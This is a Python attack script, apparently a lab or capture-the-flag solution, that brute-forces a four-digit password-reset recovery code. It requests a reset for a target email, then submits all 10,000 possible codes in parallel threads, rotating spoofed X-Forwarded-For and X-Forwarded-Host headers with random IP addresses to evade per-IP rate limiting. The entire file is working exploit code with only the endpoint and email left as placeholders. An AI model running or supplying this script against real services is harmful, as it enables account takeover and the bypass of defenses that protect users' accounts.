import requests
import re
import time
from random import randint
from concurrent.futures import ThreadPoolExecutor

# Function to attempt a single recovery code
def try_code(code):
    global s, url  # Use the session and URL from the global scope
    s.headers.update({
        "X-Forwarded-For": f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
        "X-Forwarded-Host": f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}"
    })

    code_str = f"{code:04d}"
    answer = s.post(url=url, data={"recovery_code": code_str, "s": 180})

    res = re.search(r"Invalid or expired recovery code", answer.text)
    if not res:
        print(f"[+] Found valid recovery code: {code_str}")
        return code_str
    return None


# Initialize session and make the initial request
s = requests.session()
url = "<reset-pass-endpoint>"
s.headers.update({"Content-Type": "application/x-www-form-urlencoded"})
r = s.post(url=url, data={"email": "<email>"})


# Use ThreadPoolExecutor to test multiple codes concurrently
with ThreadPoolExecutor(max_workers=6) as executor:
    futures = {executor.submit(try_code, code): code for code in range(0, 10000)}

    for future in futures:
        code = futures[future]
        if code % 100 == 0:
            print(f"[*] Trying code: {code:04d}")

        result = future.result()
        if result is not None:
            print(f"[✓] Found valid recovery code: {result}")
            break

        time.sleep(0.2)
